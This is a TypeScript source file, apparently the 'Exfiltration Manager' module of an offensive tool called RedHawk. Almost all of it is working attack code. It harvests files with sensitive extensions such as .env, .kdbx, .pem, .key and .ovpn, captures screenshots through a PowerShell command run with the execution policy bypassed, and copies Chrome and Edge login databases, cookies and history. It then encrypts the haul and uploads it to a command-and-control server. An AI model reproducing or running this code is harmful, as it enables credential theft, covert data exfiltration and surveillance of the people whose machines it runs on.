/**
 * RedHawk — Exfiltration Manager
 *
 * Handles data collection, packaging, and transfer.
 * Integrates with the C2 server for remote exfiltration
 * and provides local collection capabilities.
 */

import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';
import { EventEmitter } from 'events';

export interface ExfilJob {
  id: string;
  name: string;
  type: 'file_collect' | 'screenshot' | 'browser_data' | 'keylog' | 'custom';
  target: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  progress: number;
  results: ExfilResult[];
  createdAt: string;
  completedAt: string | null;
  encrypted: boolean;
  compression: 'none' | 'zip';
  destination: 'local' | 'c2';
}

export interface ExfilResult {
  path: string;
  size: number;
  type: string;
  hash: string;
  timestamp: string;
  uploaded: boolean;
}

const EXFIL_DIR = 'redhawk_exfil';

export class ExfilManager extends EventEmitter {
  private workDir: string;
  private jobs: ExfilJob[] = [];
  private encryptionKey: Buffer;

  constructor(userDataPath: string) {
    super();
    this.workDir = path.join(userDataPath, EXFIL_DIR);
    this.ensureDirs();

    // Generate or load encryption key
    const keyFile = path.join(this.workDir, '.exfil_key');
    if (fs.existsSync(keyFile)) {
      this.encryptionKey = fs.readFileSync(keyFile);
    } else {
      this.encryptionKey = crypto.randomBytes(32);
      fs.writeFileSync(keyFile, this.encryptionKey);
    }

    this.loadJobs();
  }

  private ensureDirs() {
    for (const dir of [this.workDir, path.join(this.workDir, 'collected'), path.join(this.workDir, 'packages')]) {
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    }
  }

  private loadJobs() {
    const jobsFile = path.join(this.workDir, 'exfil_jobs.json');
    if (fs.existsSync(jobsFile)) {
      try {
        this.jobs = JSON.parse(fs.readFileSync(jobsFile, 'utf-8'));
      } catch { this.jobs = []; }
    }
  }

  private saveJobs() {
    fs.writeFileSync(path.join(this.workDir, 'exfil_jobs.json'), JSON.stringify(this.jobs, null, 2));
  }

  getJobs(): ExfilJob[] {
    return this.jobs;
  }

  getJob(id: string): ExfilJob | undefined {
    return this.jobs.find((j) => j.id === id);
  }

  /**
   * Create a file collection job — gathers files matching patterns
   */
  createFileCollectionJob(name: string, targetDir: string, patterns: string[], recursive = true): ExfilJob {
    const job: ExfilJob = {
      id: `exfil_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      name,
      type: 'file_collect',
      target: targetDir,
      status: 'pending',
      progress: 0,
      results: [],
      createdAt: new Date().toISOString(),
      completedAt: null,
      encrypted: true,
      compression: 'zip',
      destination: 'local',
    };

    this.jobs.push(job);
    this.saveJobs();
    return job;
  }

  /**
   * Collect files matching patterns from a directory
   */
  async collectFiles(jobId: string): Promise<ExfilJob> {
    const job = this.getJob(jobId);
    if (!job) throw new Error('Job not found');

    job.status = 'running';
    job.progress = 0;
    this.emit('jobUpdate', job);

    const collectedDir = path.join(this.workDir, 'collected', job.id);
    if (!fs.existsSync(collectedDir)) fs.mkdirSync(collectedDir, { recursive: true });

    const results: ExfilResult[] = [];
    const patterns = ['*.txt', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.pdf',
      '*.csv', '*.sql', '*.env', '*.config', '*.json', '*.xml',
      '*.kdbx', '*.rdp', '*.vnc', '*.ovpn', '*.pem', '*.key'];

    try {
      await this.walkDirectory(job.target, collectedDir, patterns, results);
    } catch (err: any) {
      job.status = 'failed';
      this.emit('error', err.message);
    }

    job.results = results;
    job.progress = 100;
    job.status = 'completed';
    job.completedAt = new Date().toISOString();
    this.saveJobs();
    this.emit('jobUpdate', job);

    return job;
  }

  /**
   * Take a screenshot (PowerShell on Windows)
   */
  async takeScreenshot(jobId?: string): Promise<ExfilResult | null> {
    const screenshotDir = path.join(this.workDir, 'collected', 'screenshots');
    if (!fs.existsSync(screenshotDir)) fs.mkdirSync(screenshotDir, { recursive: true });

    const filename = `screenshot_${Date.now()}.png`;
    const outputPath = path.join(screenshotDir, filename);

    try {
      const { execSync } = require('child_process');
      // PowerShell one-liner for screenshot (Windows only)
      const psScript = `
        Add-Type -AssemblyName System.Windows.Forms;
        Add-Type -AssemblyName System.Drawing;
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height;
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap);
        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
        $bitmap.Save('${outputPath.replace(/'/g, "''")}');
        $graphics.Dispose();
        $bitmap.Dispose();
        Write-Host 'OK';
      `;
      execSync(`powershell -ExecutionPolicy Bypass -Command "${psScript}"`, { timeout: 15000 });

      if (fs.existsSync(outputPath)) {
        const stats = fs.statSync(outputPath);
        const hash = crypto.createHash('sha256').update(fs.readFileSync(outputPath)).digest('hex');

        const result: ExfilResult = {
          path: outputPath,
          size: stats.size,
          type: 'image/png',
          hash,
          timestamp: new Date().toISOString(),
          uploaded: false,
        };

        if (jobId) {
          const job = this.getJob(jobId);
          if (job) {
            job.results.push(result);
            this.saveJobs();
          }
        }

        this.emit('screenshotTaken', result);
        return result;
      }
    } catch (err: any) {
      this.emit('error', `Screenshot failed: ${err.message}`);
    }
    return null;
  }

  /**
   * Collect browser data (Chrome/Edge/Firefox history, cookies, passwords)
   * Uses PowerShell to access Chrome/Edge SQLite databases
   */
  async collectBrowserData(jobId?: string): Promise<ExfilResult[]> {
    const browserDir = path.join(this.workDir, 'collected', 'browsers');
    if (!fs.existsSync(browserDir)) fs.mkdirSync(browserDir, { recursive: true });

    const results: ExfilResult[] = [];
    const browsers = ['Chrome', 'Edge'];

    for (const browser of browsers) {
      const userDataDir = browser === 'Chrome'
        ? `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`
        : `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`;

      if (fs.existsSync(userDataDir)) {
        // Copy Login Data, History, Cookies, Bookmarks
        const filesToCollect = ['Login Data', 'History', 'Cookies', 'Bookmarks'];
        for (const file of filesToCollect) {
          const srcPath = path.join(userDataDir, 'Default', file);
          if (fs.existsSync(srcPath)) {
            try {
              const destPath = path.join(browserDir, `${browser}_${file.replace(/\s/g, '_')}`);
              fs.copyFileSync(srcPath, destPath);
              const stats = fs.statSync(destPath);
              const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');

              results.push({
                path: destPath,
                size: stats.size,
                type: `browser/${file.toLowerCase().replace(/\s/g, '_')}`,
                hash,
                timestamp: new Date().toISOString(),
                uploaded: false,
              });
            } catch { /* file may be locked */ }
          }
        }
      }
    }

    if (jobId) {
      const job = this.getJob(jobId);
      if (job) {
        job.results.push(...results);
        this.saveJobs();
      }
    }

    this.emit('browserDataCollected', { browser: results });
    return results;
  }

  /**
   * Package collected data into encrypted archive
   */
  async packageData(jobId: string): Promise<string | null> {
    const job = this.getJob(jobId);
    if (!job || job.results.length === 0) return null;

    const packagesDir = path.join(this.workDir, 'packages');
    const archiveName = `exfil_${job.id}_${Date.now()}`;
    const archivePath = path.join(packagesDir, `${archiveName}.enc`);

    try {
      // Bundle all files into a single JSON blob with metadata
      const bundle: any = {
        job: job.name,
        createdAt: new Date().toISOString(),
        files: [],
      };

      for (const result of job.results) {
        if (fs.existsSync(result.path)) {
          const content = fs.readFileSync(result.path);
          bundle.files.push({
            originalPath: result.path,
            size: result.size,
            hash: result.hash,
            content: content.toString('base64'),
          });
        }
      }

      const jsonStr = JSON.stringify(bundle);

      // Encrypt
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipheriv('aes-256-gcm', this.encryptionKey, iv);
      let encrypted = cipher.update(jsonStr, 'utf-8', 'hex');
      encrypted += cipher.final('hex');
      const authTag = cipher.getAuthTag().toString('hex');

      // Write: IV + AuthTag + EncryptedData
      const output = Buffer.concat([
        iv,
        Buffer.from(authTag, 'hex'),
        Buffer.from(encrypted, 'hex'),
      ]);
      fs.writeFileSync(archivePath, output);

      this.emit('dataPackaged', { path: archivePath, size: output.length });
      return archivePath;
    } catch (err: any) {
      this.emit('error', `Package failed: ${err.message}`);
      return null;
    }
  }

  /**
   * Exfiltrate packaged data to C2 server
   */
  async exfiltrateToC2(packagePath: string, c2Url: string): Promise<boolean> {
    if (!fs.existsSync(packagePath)) {
      this.emit('error', 'Package file not found');
      return false;
    }

    try {
      const content = fs.readFileSync(packagePath);
      const data = JSON.stringify({
        filename: path.basename(packagePath),
        content: content.toString('base64'),
      });

      const { fetch } = require('http');
      // Use Node's built-in http/https
      const proto = c2Url.startsWith('https') ? require('https') : require('http');
      const urlObj = new URL(`${c2Url}/c2/upload`);

      return new Promise((resolve) => {
        const options = {
          hostname: urlObj.hostname,
          port: urlObj.port,
          path: '/c2/upload',
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Content-Length': data.length },
        };

        const req = proto.request(options, (res: any) => {
          let body = '';
          res.on('data', (d: string) => { body += d; });
          res.on('end', () => {
            this.emit('exfiltrated', { package: packagePath, success: res.statusCode === 200 });
            resolve(res.statusCode === 200);
          });
        });

        req.on('error', (err: Error) => {
          this.emit('error', `Exfil failed: ${err.message}`);
          resolve(false);
        });

        req.write(data);
        req.end();
      });
    } catch (err: any) {
      this.emit('error', `Exfil error: ${err.message}`);
      return false;
    }
  }

  /**
   * Recursively walk a directory and collect matching files
   */
  private async walkDirectory(dir: string, outputDir: string, patterns: string[], results: ExfilResult[]) {
    if (!fs.existsSync(dir)) return;

    const items = fs.readdirSync(dir, { withFileTypes: true });
    let count = 0;

    for (const item of items) {
      const fullPath = path.join(dir, item.name);

      try {
        if (item.isDirectory()) {
          if (item.name !== 'node_modules' && item.name !== '.git' && item.name !== 'venv') {
            await this.walkDirectory(fullPath, outputDir, patterns, results);
          }
        } else if (item.isFile()) {
          const ext = path.extname(item.name).toLowerCase();
          if (patterns.some((p) => {
            if (p.startsWith('*.')) return ext === p.slice(1);
            return item.name === p;
          })) {
            const destPath = path.join(outputDir, `${count}_${item.name}`);
            fs.copyFileSync(fullPath, destPath);
            const stats = fs.statSync(destPath);
            const hash = crypto.createHash('sha256').update(fs.readFileSync(destPath)).digest('hex');

            results.push({
              path: destPath,
              size: stats.size,
              type: `file/${ext.slice(1) || 'unknown'}`,
              hash,
              timestamp: new Date().toISOString(),
              uploaded: false,
            });
            count++;
          }
        }
      } catch { /* permission errors, skip */ }
    }
  }

  /**
   * Get encryption key (for display/export)
   */
  getEncryptionKey(): string {
    return this.encryptionKey.toString('hex');
  }

  /**
   * Get total collected data size
   */
  getTotalSize(): number {
    let total = 0;
    for (const job of this.jobs) {
      for (const r of job.results) {
        total += r.size;
      }
    }
    return total;
  }

  /**
   * Clear all collected data
   */
  clearAll(): void {
    this.jobs = [];
    if (fs.existsSync(this.workDir)) {
      fs.rmSync(this.workDir, { recursive: true, force: true });
      this.ensureDirs();
    }
    this.emit('cleared');
  }
}
